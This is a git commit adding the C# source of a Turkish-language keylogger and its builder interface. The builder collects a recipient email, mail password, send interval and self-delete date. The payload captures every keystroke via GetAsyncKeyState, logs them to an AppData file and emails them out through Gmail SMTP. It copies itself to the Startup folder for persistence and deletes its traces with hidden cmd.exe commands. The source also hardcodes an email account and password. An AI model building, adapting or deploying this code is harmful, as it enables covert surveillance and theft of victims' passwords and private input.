739d0983edb52f87603c048808f0d012671c87b8
fatihyldrim <fatihyildirim93@gmail.com>
2016-11-20 17:47:29 +0200

    Add files via upload

---
+++ Keylogger_Grayscale V2/CreateOwnKeylogger_GrayScale/Form1.Designer.cs
@@ -0,0 +1,237 @@
+﻿namespace CreateOwnKeylogger_GrayScale
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.label1 = new System.Windows.Forms.Label();
+            this.txtEMail = new System.Windows.Forms.TextBox();
+            this.label2 = new System.Windows.Forms.Label();
+            this.numericUpDown1 = new System.Windows.Forms.NumericUpDown();
+            this.label3 = new System.Windows.Forms.Label();
+            this.dateTimePicker1 = new System.Windows.Forms.DateTimePicker();
+            this.button1 = new System.Windows.Forms.Button();
+            this.label6 = new System.Windows.Forms.Label();
+            this.saveFileDialog1 = new System.Windows.Forms.SaveFileDialog();
+            this.button2 = new System.Windows.Forms.Button();
+            this.label5 = new System.Windows.Forms.Label();
+            this.txtSifre = new System.Windows.Forms.TextBox();
+            this.label4 = new System.Windows.Forms.Label();
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.label1.ForeColor = System.Drawing.Color.LawnGreen;
+            this.label1.Location = new System.Drawing.Point(12, 78);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(130, 17);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "Log alınacak e-mail";
+            // 
+            // txtEMail
+            // 
+            this.txtEMail.BackColor = System.Drawing.Color.Lime;
+            this.txtEMail.Location = new System.Drawing.Point(153, 75);
+            this.txtEMail.Name = "txtEMail";
+            this.txtEMail.Size = new System.Drawing.Size(165, 20);
+            this.txtEMail.TabIndex = 1;
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.label2.ForeColor = System.Drawing.Color.LawnGreen;
+            this.label2.Location = new System.Drawing.Point(12, 149);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(137, 17);
+            this.label2.TabIndex = 2;
+            this.label2.Text = "Log alma süresi (dk)";
+            // 
+            // numericUpDown1
+            // 
+            this.numericUpDown1.BackColor = System.Drawing.Color.Lime;
+            this.numericUpDown1.ForeColor = System.Drawing.Color.Black;
+            this.numericUpDown1.Location = new System.Drawing.Point(153, 149);
+            this.numericUpDown1.Name = "numericUpDown1";
+            this.numericUpDown1.Size = new System.Drawing.Size(50, 20);
+            this.numericUpDown1.TabIndex = 3;
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.label3.ForeColor = System.Drawing.Color.LawnGreen;
+            this.label3.Location = new System.Drawing.Point(12, 189);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(126, 17);
+            this.label3.TabIndex = 4;
+            this.label3.Text = "Kendini silme tarihi";
+            // 
+            // dateTimePicker1
+            // 
+            this.dateTimePicker1.CalendarFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(163)));
+            this.dateTimePicker1.CalendarForeColor = System.Drawing.Color.Black;
+            this.dateTimePicker1.CalendarMonthBackground = System.Drawing.Color.Black;
+            this.dateTimePicker1.CalendarTitleBackColor = System.Drawing.SystemColors.ActiveCaptionText;
+            this.dateTimePicker1.CalendarTrailingForeColor = System.Drawing.SystemColors.ControlText;
+            this.dateTimePicker1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(163)), true);
+            this.dateTimePicker1.Format = System.Windows.Forms.DateTimePickerFormat.Short;
+            this.dateTimePicker1.ImeMode = System.Windows.Forms.ImeMode.On;
+            this.dateTimePicker1.Location = new System.Drawing.Point(153, 189);
+            this.dateTimePicker1.Name = "dateTimePicker1";
+            this.dateTimePicker1.Size = new System.Drawing.Size(102, 20);
+            this.dateTimePicker1.TabIndex = 5;
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.Color.Lime;
+            this.button1.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 14F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button1.ForeColor = System.Drawing.Color.Black;
+            this.button1.Location = new System.Drawing.Point(47, 236);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(303, 70);
+            this.button1.TabIndex = 9;
+            this.button1.Text = "Keylogger Oluştur";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // label6
+            // 
+            this.label6.AutoSize = true;
+            this.label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 15F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.label6.ForeColor = System.Drawing.Color.LawnGreen;
+            this.label6.Location = new System.Drawing.Point(132, 333);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(104, 25);
+            this.label6.TabIndex = 10;
+            this.label6.Text = "GrayScale";
+            // 
+            // saveFileDialog1
+            // 
+            this.saveFileDialog1.Filter = "EXE|*.exe";
+            this.saveFileDialog1.Title = "Oluşacak yeri seçin";
+            // 
+            // button2
+            // 
+            this.button2.BackColor = System.Drawing.Color.Lime;
+            this.button2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
+            this.button2.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button2.Font = new System.Drawing.Font("Microsoft Sans Serif", 5F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button2.ForeColor = System.Drawing.Color.Black;
+            this.button2.Location = new System.Drawing.Point(336, 17);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(34, 27);
+            this.button2.TabIndex = 11;
+            this.button2.Text = "X";
+            this.button2.UseVisualStyleBackColor = false;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 14F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.label5.ForeColor = System.Drawing.Color.LawnGreen;
+            this.label5.Location = new System.Drawing.Point(102, 20);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(153, 24);
+            this.label5.TabIndex = 8;
+            this.label5.Text = "Keylogger V1.0";
+            // 
+            // txtSifre
+            // 
+            this.txtSifre.BackColor = System.Drawing.Color.Lime;
+            this.txtSifre.Location = new System.Drawing.Point(153, 112);
+            this.txtSifre.Name = "txtSifre";
+            this.txtSifre.Size = new System.Drawing.Size(165, 20);
+            this.txtSifre.TabIndex = 13;
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.label4.ForeColor = System.Drawing.Color.LawnGreen;
+            this.label4.Location = new System.Drawing.Point(12, 112);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(76, 17);
+            this.label4.TabIndex = 12;
+            this.label4.Text = "Mail Şifresi";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.Black;
+            this.ClientSize = new System.Drawing.Size(390, 398);
+            this.Controls.Add(this.txtSifre);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.label6);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.label5);
+            this.Controls.Add(this.dateTimePicker1);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.numericUpDown1);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.txtEMail);
+            this.Controls.Add(this.label1);
+            this.ForeColor = System.Drawing.Color.Lime;
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "Form1";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "GrayScale-nrgl";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.TextBox txtEMail;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.NumericUpDown numericUpDown1;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Label label6;
+        private System.Windows.Forms.SaveFileDialog saveFileDialog1;
+        private System.Windows.Forms.Button button2;
+        public System.Windows.Forms.DateTimePicker dateTimePicker1;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.TextBox txtSifre;
+        private System.Windows.Forms.Label label4;
+    }
+}
+
---
+++ Keylogger_Grayscale V2/KeyLog_V1/Program.cs
@@ -0,0 +1,184 @@
+﻿using System;
+using System.Web;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.Mail;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using Microsoft.Win32;
+using System.Diagnostics;
+
+namespace KeyLog_V1
+{
+    class Program
+    {
+        [DllImport("user32.dll")]
+        static extern short GetAsyncKeyState(int vkey);
+        delegate void KontrolHandler();
+        static int gonDakika = 1;
+        static int suankiDakika = 0;
+        static int dk = 0;
+        static string Email = "hku.grayscale@gmail.com";
+        static string Sifre = "Y3ni1'N3sil.";
+        static string gonEmail = "hku.grayscale@gmail.com";
+        static DateTime SilmeTarihi = DateTime.Now;
+
+        static void Main()
+        {
+            suankiDakika = SuanDakika();
+            KontrolHandler h = new KontrolHandler(Kontrol);
+            h.BeginInvoke(new AsyncCallback(islemSonlandi), null);
+            Console.ReadLine();
+            Application.Run(); // referanslara System.Windows.Form ekle - Uygulamanın görünmemesi için Solution Propertiesden Windows Application yap.
+        }
+
+        static void ExpoldeYourSelf()
+        {
+            //    System.Diagnostics.Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del \"" + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Startup\GrayKey.exe");
+            //Application.Exit();
+
+            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo()
+            {
+                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\GrayLog.txt",
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true,
+                FileName = "cmd.exe"
+            });
+
+            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo()
+        {
+            Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Startup\GrayKey.exe",
+            WindowStyle = ProcessWindowStyle.Hidden,
+            CreateNoWindow = true,
+            FileName = "cmd.exe"
+        });
+        }
+
+        // basılan tuşları teker teker ele al
+        static Int16 MakeChar(Int16 key)
+        {
+            Int16[] keycode = { 220, 219, 222, 191, 186, 221 }, charcode = { 199, 286, 304, 214, 350, 220, 231, 287, 105, 246, 351, 252 };
+            int keyIndex = Array.IndexOf(keycode, key);
+
+            bool nocaps = (!Control.IsKeyLocked(Keys.CapsLock) && Control.ModifierKeys != Keys.Shift) || (Control.IsKeyLocked(Keys.CapsLock) && Control.ModifierKeys == Keys.Shift);
+            if (nocaps && key > 64 && key < 91)
+            {
+                key = (Int16)(key == 73 ? 305 : key + 32);
+            }
+            else if (keyIndex != -1)
+            {
+                key = nocaps ? charcode[keyIndex + 6] : charcode[keyIndex];
+            }
+
+            Debug.Write((char)key);
+
+            return key;
+        }
+        static void Kontrol()
+        {
+            while (true)
+            {
+                for (int i = 0; i < Int16.MaxValue; i++)
+                {
+                    if (GetAsyncKeyState(i).Equals(Int16.MinValue + 1))
+                    {
+                        char key = Convert.ToChar(MakeChar((Int16)i));
+                    TusKaydet(key.ToString());
+                    }
+                }
+
+                if (suankiDakika + gonDakika >= 60)
+                {
+                    dk = (suankiDakika + gonDakika) % 60;
+                }
+                else
+                {
+                    dk = suankiDakika + gonDakika;
+                }
+                if (SuanDakika() == dk)
+                {
+                    suankiDakika = SuanDakika();
+                    MailGonder();
+                }
+            }
+        }
+
+        static void MailGonder()
+        {
+            string veriler = Oku();
+            MailMessage mesaj = new MailMessage(Email, gonEmail, "LOG", veriler);
+            SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
+            smtp.EnableSsl = true;
+            smtp.UseDefaultCredentials = true;
+            smtp.Credentials = new NetworkCredential(Email, Sifre);
+            smtp.Send(mesaj);
+
+            //mail göndermek için yukarıdaki ayarlar yeterli dğeil. kullanacağınız mail adresini açıp " https://www.google.com/settings/security/lesssecureapps " adresine gidin. ve mail adresinizi güvenilir olmayan programlar tarafından kullanılmasını onaylayın. Güvenilir olmayan program da bu program oluyor.
+
+        }
+
+        //mail atmak içinyazdığın dosyayı oku
+        static string Oku()
+        {
+            FileStream fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/GrayLog.txt", FileMode.Open, FileAccess.Read);
+            StreamReader sr = new StreamReader(fs);
+            string veriler = sr.ReadToEnd();
+            fs.Close();
+            Sil();
+            return veriler;
+        }
+
+        //mail atttıktan sonra yazdığın dosyayı sil
+        static void Sil()
+        {
+            FileStream fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/GrayLog.txt", FileMode.Create, FileAccess.Write);
+            StreamWriter sw = new StreamWriter(fs);
+            sw.Write("");
+            sw.Flush();
+            fs.Close();
+        }
+
+        static int SuanDakika()
+        {
+            string suan = DateTime.Now.ToShortTimeString();
+            int dakika = int.Parse(suan.Substring(suan.IndexOf(':') + 1, suan.Length - suan.IndexOf(':') - 1));
+            return dakika;
+        }
+
+        static void islemSonlandi(IAsyncResult iar)
+        {
+        }
+
+
+        //tuşu burada dosyaya kaydet
+        static void TusKaydet(string tus)
+        {
+            FileStream fs = null;
+            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/GrayLog.txt"))
+                fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/GrayLog.txt", FileMode.Append, FileAccess.Write);
+            else
+                fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/GrayLog.txt", FileMode.CreateNew, FileAccess.Write);
+            StreamWriter sw = new StreamWriter(fs);
+            sw.Write(tus);
+            sw.Flush();
+            fs.Close();
+        }
+
+
+        //çalıştırıldığında kendini başlangıç klasorne kopyala
+        static void ExeKopyalama()
+        {
+            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Startup\GrayKey.exe"))
+            {
+                File.Copy(Path.GetFileName(Application.ExecutablePath), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Startup\GrayKey.exe");
+            }
+        }
+
+
+
+    }
+}
